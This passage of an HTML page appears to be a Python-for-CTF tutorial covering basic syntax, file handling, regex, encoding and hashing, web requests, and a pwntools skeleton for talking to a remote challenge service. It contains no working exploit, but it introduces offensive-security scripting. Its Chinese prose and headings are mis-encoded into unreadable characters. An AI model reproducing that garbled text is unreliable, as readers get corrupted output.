href="#13-%E5%B8%B8%E8%A7%81%E6%93%8D%E4%BD%9C%E7%AC%A6">1.3 å¸¸è§æ“ä½œç¬¦</a></li><li><a href="#14-%E6%9D%A1%E4%BB%B6%E8%AF%AD%E5%8F%A5">1.4 æ¡ä»¶è¯­å¥</a></li><li><a href="#15-%E5%BE%AA%E7%8E%AF%E7%BB%93%E6%9E%84">1.5 å¾ªç¯ç»“æ„</a></li><li><a href="#16-%E5%88%97%E8%A1%A8%E4%B8%8E%E5%AD%97%E5%85%B8">1.6 åˆ—è¡¨ä¸å­—å…¸</a></li></ul></li><li><p><a href="#2-%E5%87%BD%E6%95%B0%E4%B8%8E%E6%A8%A1%E5%9D%97">2. å‡½æ•°ä¸æ¨¡å—</a></p><ul><li><a href="#21-%E5%87%BD%E6%95%B0%E5%AE%9A%E4%B9%89%E4%B8%8E%E8%B0%83%E7%94%A8">2.1 å‡½æ•°å®šä¹‰ä¸è°ƒç”¨</a></li><li><a href="#22-%E6%A8%A1%E5%9D%97%E5%AF%BC%E5%85%A5">2.2 æ¨¡å—å¯¼å…¥</a></li></ul></li><li><p><a href="#3-%E8%BF%9B%E9%98%B6%E5%86%85%E5%AE%B9">3. è¿›é˜¶å†…å®¹</a></p><ul><li><a href="#31-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99">3.1 æ–‡ä»¶è¯»å†™</a></li><li><a href="#32-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86">3.2 å¼‚å¸¸å¤„ç†</a></li><li><a href="#33-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8Fregex">3.3 æ­£åˆ™è¡¨è¾¾å¼ï¼ˆRegexï¼‰</a></li><li><a href="#34-%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86">3.4 åŠ å¯†ä¸è§£å¯†</a></li></ul></li><li><p><a href="#4-%E9%AB%98%E7%BA%A7%E5%86%85%E5%AE%B9">4. é«˜çº§å†…å®¹</a></p><ul><li><a href="#41-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E4%B8%8E%E5%A4%9A%E8%BF%9B%E7%A8%8B">4.1 å¤šçº¿ç¨‹ä¸å¤šè¿›ç¨‹</a></li><li><a href="#42-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%88%AC%E8%99%AB">4.2 ç½‘ç»œä¸çˆ¬è™«</a></li><li><a href="#43-%E5%88%A9%E7%94%A8python%E8%BF%9B%E8%A1%8C%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99">4.3 åˆ©ç”¨Pythonè¿›è¡Œè‡ªåŠ¨åŒ–è„šæœ¬ç¼–å†™</a></li></ul></li><li><p><a href="#5-ctf%E4%B8%AD%E7%9A%84python%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF">5. CTFä¸­çš„Pythonåº”ç”¨åœºæ™¯</a></p><ul><li><a href="#51-exploit%E5%BC%80%E5%8F%91">5.1 Exploitå¼€å‘</a></li><li><a href="#52-%E9%80%86%E5%90%91%E4%B8%8E%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90">5.2 é€†å‘ä¸äºŒè¿›åˆ¶åˆ†æ</a></li><li><a href="#53-%E5%A4%8D%E6%9D%82%E7%9A%84%E7%AE%97%E6%B3%95%E9%A2%98">5.3 å¤æ‚çš„ç®—æ³•é¢˜</a></li></ul></li></ul><h4 id="1-1-PythonåŸºæœ¬è¯­æ³•"><a href="#1-1-PythonåŸºæœ¬è¯­æ³•" class="headerlink" title="1.1 PythonåŸºæœ¬è¯­æ³•"></a>1.1 PythonåŸºæœ¬è¯­æ³•</h4><p><strong>Hello World</strong>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Hello, World!&quot;</span>)<br></code></pre></td></tr></table></figure><p>è¿™æ˜¯Pythonçš„å…¥é—¨ç¤ºä¾‹ï¼Œäº†è§£Pythonå¦‚ä½•è¾“å‡ºä¿¡æ¯ã€‚</p><h4 id="1-2-æ•°æ®ç±»å‹"><a href="#1-2-æ•°æ®ç±»å‹" class="headerlink" title="1.2 æ•°æ®ç±»å‹"></a>1.2 æ•°æ®ç±»å‹</h4><p>Pythonä¸­çš„åŸºæœ¬æ•°æ®ç±»å‹åŒ…æ‹¬ï¼š</p><ul><li><strong>æ•´æ•°ï¼ˆintï¼‰</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">x = <span class="hljs-number">10</span><br></code></pre></td></tr></table></figure></li><li><strong>æµ®ç‚¹æ•°ï¼ˆfloatï¼‰</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">y = <span class="hljs-number">3.14</span><br></code></pre></td></tr></table></figure></li><li><strong>å­—ç¬¦ä¸²ï¼ˆstrï¼‰</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">name = <span class="hljs-string">&quot;Python&quot;</span><br></code></pre></td></tr></table></figure></li><li><strong>å¸ƒå°”å€¼ï¼ˆboolï¼‰</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">is_true = <span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure></li></ul><h4 id="1-3-å¸¸è§æ“ä½œç¬¦"><a href="#1-3-å¸¸è§æ“ä½œç¬¦" class="headerlink" title="1.3 å¸¸è§æ“ä½œç¬¦"></a>1.3 å¸¸è§æ“ä½œç¬¦</h4><ul><li>ç®—æœ¯æ“ä½œï¼š<code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>, <code>//</code>ï¼ˆæ•´é™¤ï¼‰ï¼Œ<code>%</code>ï¼ˆå–æ¨¡ï¼‰</li><li>æ¯”è¾ƒæ“ä½œï¼š<code>==</code>, <code>!=</code>, <code>&gt;</code>, <code>&lt;</code>, <code>&gt;=</code>, <code>&lt;=</code></li><li>é€»è¾‘æ“ä½œï¼š<code>and</code>, <code>or</code>, <code>not</code></li></ul><h4 id="1-4-æ¡ä»¶è¯­å¥"><a href="#1-4-æ¡ä»¶è¯­å¥" class="headerlink" title="1.4 æ¡ä»¶è¯­å¥"></a>1.4 æ¡ä»¶è¯­å¥</h4><p>CTFä¸­çš„è®¸å¤šé€»è¾‘éƒ½ä¾èµ–äºæ¡ä»¶åˆ¤æ–­ï¼Œäº†è§£<code>if-else</code>è¯­å¥æ˜¯å¿…è¦çš„ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">5</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;x å¤§äº 5&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;x å°äºæˆ–ç­‰äº 5&quot;</span>)<br></code></pre></td></tr></table></figure><h4 id="1-5-å¾ªç¯ç»“æ„"><a href="#1-5-å¾ªç¯ç»“æ„" class="headerlink" title="1.5 å¾ªç¯ç»“æ„"></a>1.5 å¾ªç¯ç»“æ„</h4><p>Pythonæœ‰ä¸¤ç§å¸¸ç”¨çš„å¾ªç¯ï¼š<code>for</code>å¾ªç¯å’Œ<code>while</code>å¾ªç¯ã€‚</p><p><strong>for å¾ªç¯</strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    <span class="hljs-built_in">print</span>(i)<br></code></pre></td></tr></table></figure><p><strong>while å¾ªç¯</strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">x = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> x &lt; <span class="hljs-number">5</span>:<br>    <span class="hljs-built_in">print</span>(x)<br>    x += <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h4 id="1-6-åˆ—è¡¨ä¸å­—å…¸"><a href="#1-6-åˆ—è¡¨ä¸å­—å…¸" class="headerlink" title="1.6 åˆ—è¡¨ä¸å­—å…¸"></a>1.6 åˆ—è¡¨ä¸å­—å…¸</h4><ul><li><p><strong>åˆ—è¡¨ï¼ˆListï¼‰</strong>ï¼šå­˜å‚¨å¤šä¸ªå…ƒç´ ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">my_list = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>]<br></code></pre></td></tr></table></figure></li><li><p><strong>å­—å…¸ï¼ˆDictionaryï¼‰</strong>ï¼šé”®å€¼å¯¹å­˜å‚¨ç»“æ„ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">my_dict = &#123;<span class="hljs-string">&#x27;key1&#x27;</span>: <span class="hljs-string">&#x27;value1&#x27;</span>, <span class="hljs-string">&#x27;key2&#x27;</span>: <span class="hljs-string">&#x27;value2&#x27;</span>&#125;<br></code></pre></td></tr></table></figure></li></ul><h3 id="2-å‡½æ•°ä¸æ¨¡å—"><a href="#2-å‡½æ•°ä¸æ¨¡å—" class="headerlink" title="2. å‡½æ•°ä¸æ¨¡å—"></a>2. å‡½æ•°ä¸æ¨¡å—</h3><h4 id="2-1-å‡½æ•°å®šä¹‰ä¸è°ƒç”¨"><a href="#2-1-å‡½æ•°å®šä¹‰ä¸è°ƒç”¨" class="headerlink" title="2.1 å‡½æ•°å®šä¹‰ä¸è°ƒç”¨"></a>2.1 å‡½æ•°å®šä¹‰ä¸è°ƒç”¨</h4><p>å‡½æ•°åœ¨CTFä¸­æ˜¯ç»„ç»‡ä»£ç ã€å¤ç”¨åŠŸèƒ½çš„é‡è¦å·¥å…·ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params">name</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Hello, <span class="hljs-subst">&#123;name&#125;</span>!&quot;</span><br><br><span class="hljs-built_in">print</span>(greet(<span class="hljs-string">&quot;CTF é€‰æ‰‹&quot;</span>))<br></code></pre></td></tr></table></figure><h4 id="2-2-æ¨¡å—å¯¼å…¥"><a href="#2-2-æ¨¡å—å¯¼å…¥" class="headerlink" title="2.2 æ¨¡å—å¯¼å…¥"></a>2.2 æ¨¡å—å¯¼å…¥</h4><p>CTFä¸­å¸¸ç”¨Pythonæ ‡å‡†åº“å’Œç¬¬ä¸‰æ–¹æ¨¡å—è¿›è¡Œä¿¡æ¯å¤„ç†ã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib  <span class="hljs-comment"># ç”¨äºå“ˆå¸Œå‡½æ•°</span><br><br><span class="hljs-comment"># ç”Ÿæˆå­—ç¬¦ä¸²çš„MD5å€¼</span><br>hash_object = hashlib.md5(<span class="hljs-string">b&#x27;CTF&#x27;</span>).hexdigest()<br><span class="hljs-built_in">print</span>(hash_object)<br></code></pre></td></tr></table></figure><p>CTFå¸¸ç”¨çš„æ¨¡å—åŒ…æ‹¬<code>hashlib</code>ï¼ˆå¤„ç†å“ˆå¸Œç®—æ³•ï¼‰ã€<code>requests</code>ï¼ˆç½‘ç»œè¯·æ±‚ï¼‰ã€<code>re</code>ï¼ˆæ­£åˆ™è¡¨è¾¾å¼ï¼‰ç­‰ã€‚</p><h3 id="3-è¿›é˜¶å†…å®¹"><a href="#3-è¿›é˜¶å†…å®¹" class="headerlink" title="3. è¿›é˜¶å†…å®¹"></a>3. è¿›é˜¶å†…å®¹</h3><h4 id="3-1-æ–‡ä»¶è¯»å†™"><a href="#3-1-æ–‡ä»¶è¯»å†™" class="headerlink" title="3.1 æ–‡ä»¶è¯»å†™"></a>3.1 æ–‡ä»¶è¯»å†™</h4><p>åœ¨CTFæ¯”èµ›ä¸­ï¼Œå¾ˆå¤šæƒ…å†µä¸‹éœ€è¦å¯¹æ–‡ä»¶è¿›è¡Œè¯»å†™æ“ä½œï¼Œé€šå¸¸ç”¨äºè¯»å–è¾“å…¥æ•°æ®æˆ–å†™å…¥è§£é¢˜ç»“æœã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># è¯»å–æ–‡ä»¶</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;input.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    data = f.read()<br><br><span class="hljs-comment"># å†™å…¥æ–‡ä»¶</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;output.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(<span class="hljs-string">&#x27;è¿™æ˜¯ç»“æœè¾“å‡º&#x27;</span>)<br></code></pre></td></tr></table></figure><h4 id="3-2-å¼‚å¸¸å¤„ç†"><a href="#3-2-å¼‚å¸¸å¤„ç†" class="headerlink" title="3.2 å¼‚å¸¸å¤„ç†"></a>3.2 å¼‚å¸¸å¤„ç†</h4><p>CTFä¸­çš„ä»£ç æœ‰æ—¶ä¼šå‡ºç°æ„å¤–é”™è¯¯ï¼Œå¼‚å¸¸å¤„ç†å¯ä»¥ç¡®ä¿ç¨‹åºåœ¨é”™è¯¯æƒ…å†µä¸‹ä¹Ÿèƒ½ç¨³å®šè¿è¡Œã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">try</span>:<br>    result = <span class="hljs-number">10</span> / <span class="hljs-number">0</span><br><span class="hljs-keyword">except</span> ZeroDivisionError:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ä¸èƒ½é™¤ä»¥0ï¼&quot;</span>)<br></code></pre></td></tr></table></figure><h4 id="3-3-æ­£åˆ™è¡¨è¾¾å¼ï¼ˆRegexï¼‰"><a href="#3-3-æ­£åˆ™è¡¨è¾¾å¼ï¼ˆRegexï¼‰" class="headerlink" title="3.3 æ­£åˆ™è¡¨è¾¾å¼ï¼ˆRegexï¼‰"></a>3.3 æ­£åˆ™è¡¨è¾¾å¼ï¼ˆRegexï¼‰</h4><p>æ­£åˆ™è¡¨è¾¾å¼å¸¸ç”¨äºCTFä¸­çš„ä¿¡æ¯æå–ï¼Œå°¤å…¶æ˜¯æ–‡æœ¬åˆ†æå’Œæ•°æ®è¿‡æ»¤ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><br>text = <span class="hljs-string">&quot;flag&#123;this_is_a_flag&#125;&quot;</span><br>pattern = <span class="hljs-string">r&#x27;flag&#123;.*&#125;&#x27;</span><br><span class="hljs-keyword">match</span> = re.search(pattern, text)<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;æ‰¾åˆ°äº†flag:&quot;</span>, <span class="hljs-keyword">match</span>.group())<br></code></pre></td></tr></table></figure><h4 id="3-4-åŠ å¯†ä¸è§£å¯†"><a href="#3-4-åŠ å¯†ä¸è§£å¯†" class="headerlink" title="3.4 åŠ å¯†ä¸è§£å¯†"></a>3.4 åŠ å¯†ä¸è§£å¯†</h4><p>åœ¨CTFä¸­ï¼ŒåŠ å¯†ä¸è§£å¯†ä»»åŠ¡éå¸¸å¸¸è§ã€‚ä½¿ç”¨Pythonå¤„ç†å¸¸è§çš„åŠ å¯†&#x2F;è§£å¯†ä»»åŠ¡æ˜¯ä¸€é¡¹å¿…å¤‡æŠ€èƒ½ã€‚</p><p><strong>Base64è§£ç </strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>encoded = <span class="hljs-string">b&#x27;UHl0aG9u&#x27;</span><br>decoded = base64.b64decode(encoded)<br><span class="hljs-built_in">print</span>(decoded.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br></code></pre></td></tr></table></figure><p><strong>å“ˆå¸Œè®¡ç®—</strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br>data = <span class="hljs-string">b&quot;password123&quot;</span><br>hash_md5 = hashlib.md5(data).hexdigest()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;MD5:&quot;</span>, hash_md5)<br><br>hash_sha256 = hashlib.sha256(data).hexdigest()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;SHA256:&quot;</span>, hash_sha256)<br></code></pre></td></tr></table></figure><h3 id="4-é«˜çº§å†…å®¹"><a href="#4-é«˜çº§å†…å®¹" class="headerlink" title="4. é«˜çº§å†…å®¹"></a>4. é«˜çº§å†…å®¹</h3><h4 id="4-1-å¤šçº¿ç¨‹ä¸å¤šè¿›ç¨‹"><a href="#4-1-å¤šçº¿ç¨‹ä¸å¤šè¿›ç¨‹" class="headerlink" title="4.1 å¤šçº¿ç¨‹ä¸å¤šè¿›ç¨‹"></a>4.1 å¤šçº¿ç¨‹ä¸å¤šè¿›ç¨‹</h4><p>å½“éœ€è¦å¤„ç†å¤§é‡æ•°æ®æˆ–å¹¶å‘ä»»åŠ¡æ—¶ï¼Œå¤šçº¿ç¨‹å’Œå¤šè¿›ç¨‹èƒ½æ˜¾è‘—æé«˜æ•ˆç‡ã€‚</p><p><strong>å¤šçº¿ç¨‹</strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> threading<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">task</span>(<span class="hljs-params">name</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Task <span class="hljs-subst">&#123;name&#125;</span> is running&quot;</span>)<br><br>thread1 = threading.Thread(target=task, args=(<span class="hljs-string">&quot;A&quot;</span>,))<br>thread2 = threading.Thread(target=task, args=(<span class="hljs-string">&quot;B&quot;</span>,))<br>thread1.start()<br>thread2.start()<br>thread1.join()<br>thread2.join()<br></code></pre></td></tr></table></figure><h4 id="4-2-ç½‘ç»œä¸çˆ¬è™«"><a href="#4-2-ç½‘ç»œä¸çˆ¬è™«" class="headerlink" title="4.2 ç½‘ç»œä¸çˆ¬è™«"></a>4.2 ç½‘ç»œä¸çˆ¬è™«</h4><p>CTFä¸­çš„ä¸€äº›é¢˜ç›®æ¶‰åŠç½‘ç»œçˆ¬è™«ï¼Œä½¿ç”¨Pythonå¯ä»¥å¿«é€Ÿè·å–å¹¶åˆ†æç½‘é¡µå†…å®¹ã€‚</p><p><strong>è¯·æ±‚ç½‘é¡µ</strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>response = requests.get(<span class="hljs-string">&#x27;http://example.com&#x27;</span>)<br><span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure><p><strong>è§£æHTML</strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br>soup = BeautifulSoup(response.text, <span class="hljs-string">&#x27;html.parser&#x27;</span>)<br><span class="hljs-built_in">print</span>(soup.title.text)<br></code></pre></td></tr></table></figure><h4 id="4-3-åˆ©ç”¨Pythonè¿›è¡Œè‡ªåŠ¨åŒ–è„šæœ¬ç¼–å†™"><a href="#4-3-åˆ©ç”¨Pythonè¿›è¡Œè‡ªåŠ¨åŒ–è„šæœ¬ç¼–å†™" class="headerlink" title="4.3 åˆ©ç”¨Pythonè¿›è¡Œè‡ªåŠ¨åŒ–è„šæœ¬ç¼–å†™"></a>4.3 åˆ©ç”¨Pythonè¿›è¡Œè‡ªåŠ¨åŒ–è„šæœ¬ç¼–å†™</h4><p>è‡ªåŠ¨åŒ–æ˜¯CTFæ¯”èµ›ä¸­çš„é‡è¦æŠ€èƒ½ï¼ŒPythonå¼ºå¤§çš„è‡ªåŠ¨åŒ–èƒ½åŠ›å¯ä»¥å¸®åŠ©å¿«é€Ÿè§£å†³æŸäº›å¤æ‚é¢˜ç›®ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># è‡ªåŠ¨åŒ–å‘é€è¯·æ±‚</span><br><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://example.com/login&quot;</span><br>data = &#123;<span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;ctf&#x27;</span>, <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;12345&#x27;</span>&#125;<br>response = requests.post(url, data=data)<br><span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure><h3 id="5-CTFä¸­çš„Pythonåº”ç”¨åœºæ™¯"><a href="#5-CTFä¸­çš„Pythonåº”ç”¨åœºæ™¯" class="headerlink" title="5. CTFä¸­çš„Pythonåº”ç”¨åœºæ™¯"></a>5. CTFä¸­çš„Pythonåº”ç”¨åœºæ™¯</h3><h4 id="5-1-Exploitå¼€å‘"><a href="#5-1-Exploitå¼€å‘" class="headerlink" title="5.1 Exploitå¼€å‘"></a>5.1 Exploitå¼€å‘</h4><p>åœ¨ä¸€äº›CTFçš„pwné¢˜ç›®ä¸­ï¼Œé€‰æ‰‹éœ€è¦ç¼–å†™Pythonè„šæœ¬ä¸è¿œç¨‹æœåŠ¡è¿›è¡Œäº¤äº’ï¼Œä»¥åˆ©ç”¨æ¼æ´ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># è¿æ¥åˆ°è¿œç¨‹æœåŠ¡</span><br>conn = remote(<span class="hljs-string">&#x27;example.com&#x27;</span>, <span class="hljs-number">12345</span>)<br><br><span class="hljs-comment"># å‘é€æ•°æ®</span><br>conn.sendline(<span class="hljs-string">b&#x27;payload&#x27;</span>)<br><br><span class="hljs-comment"># æ¥æ”¶å“åº”</span><br>response = conn.recvline()<br><span class="hljs-built_in">print</span>(response)<br></code></pre></td></tr></table></figure><h4 id="5-2-é€†å‘ä¸äºŒè¿›åˆ¶åˆ†æ"><a href="#5-2-é€†å‘ä¸äºŒè¿›åˆ¶åˆ†æ" class="headerlink" title="5.2 é€†å‘ä¸äºŒè¿›åˆ¶åˆ†æ"></a>5.2 é€†å‘ä¸äºŒè¿›åˆ¶åˆ†æ</h4><p>Pythonå¯ä»¥é€šè¿‡ç¼–å†™è„šæœ¬æ¥è‡ªåŠ¨åŒ–é€†å‘å·¥ç¨‹ä»»åŠ¡ï¼Œè§£ç åŠ å¯†æ•°æ®æˆ–åˆ†æç¨‹åºçš„è¾“å‡ºã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># å¯¹äºŒè¿›åˆ¶æ•°æ®è¿›è¡Œè§£ç </span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;binaryfile&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    binary_data = f.read()<br><br><span class="hljs-comment"># è‡ªå®šä¹‰åˆ†æé€»è¾‘</span><br>decoded_data = binary_data.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, <span class="hljs-string">&#x27;ignore&#x27;</span>)<br><span class="hljs-built_in">print</span>(decoded_data)<br></code></pre></td></tr></table></figure><h4 id="5-3-å¤æ‚çš„ç®—æ³•é¢˜"><a href="#5-3-å¤æ‚çš„ç®—æ³•é¢˜" class="headerlink" title="5.3 å¤æ‚çš„ç®—æ³•é¢˜"></a>5.3 å¤æ‚çš„ç®—æ³•é¢˜</h4><p>CTFæ¯”èµ›ä¸­å¯èƒ½æ¶‰åŠå¤æ‚çš„æ•°å­¦ã€å›¾è®ºæˆ–å¯†ç å­¦ç®—æ³•ã€‚Pythonå†…ç½®äº†ä¸°å¯Œçš„åº“æ¥è§£å†³è¿™äº›é—®é¢˜ï¼Œå¦‚<code>sympy</code>ç”¨äºç¬¦å·è®¡ç®—ã€<code>numpy</code>ç”¨äºçŸ©é˜µè®¡ç®—ç­‰ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sympy<br><br>x = sympy.Symbol(<span class="hljs-string">&#x27;x&#x27;</span>)<br>equation = sympy.Eq(x**<span class="hljs-number">2</span> + <span class="hljs-number">2</span>*x - <span class="hljs-number">8</span>, <span class="hljs-number">0</span>)<br>solution = sympy.solve(equation)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;è§£:&quot;</span>, solution)<br></code></pre></td></tr></table></figure><p>ï¼</p><h1 id="2-JavaScript-åŸºç¡€"><a href="#2-JavaScript-åŸºç¡€" class="headerlink" title="2. JavaScript åŸºç¡€"></a><strong>2. JavaScript</strong> <strong>åŸºç¡€</strong></h1><hr><h2 id="ç›®å½•-1"><a href="#ç›®å½•-1" class="headerlink" title="ç›®å½•"></a>ç›®å½•</h2><ul><li><p><a href="#1-javascript%E4%B8%AD%E7%9A%84%E5%AF%B9%E8%B1%A1">1. JavaScriptä¸­çš„å¯¹è±¡</a></p><ul><li><a href="#11-%E5%AF%B9%E8%B1%A1%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5">1.1 å¯¹è±¡åŸºæœ¬æ¦‚å¿µ</a></li><li><a href="#12-%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%B1%9E%E6%80%A7%E8%AE%BF%E9%97%AE">1.2 å¯¹è±¡çš„å±æ€§è®¿é—®</a></li></ul></li><li><p><a href="#2-javascript%E4%B8%AD%E7%9A%84%E5%87%BD%E6%95%B0">2. JavaScriptä¸­çš„å‡½æ•°</a></p><ul><li><a href="#21-%E5%87%BD%E6%95%B0%E5%A3%B0%E6%98%8E%E4%B8%8E%E8%A1%A8%E8%BE%BE%E5%BC%8F">2.1 å‡½æ•°å£°æ˜ä¸è¡¨è¾¾å¼</a></li><li><a href="#22-%E7%AE%AD%E5%A4%B4%E5%87%BD%E6%95%B0">2.2 ç®­å¤´å‡½æ•°</a></li><li><a href="#23-this-%E5%85%B3%E9%94%AE%E5%AD%97">2.3 <code>this</code> å…³é”®å­—</a></li></ul></li><li><p><a 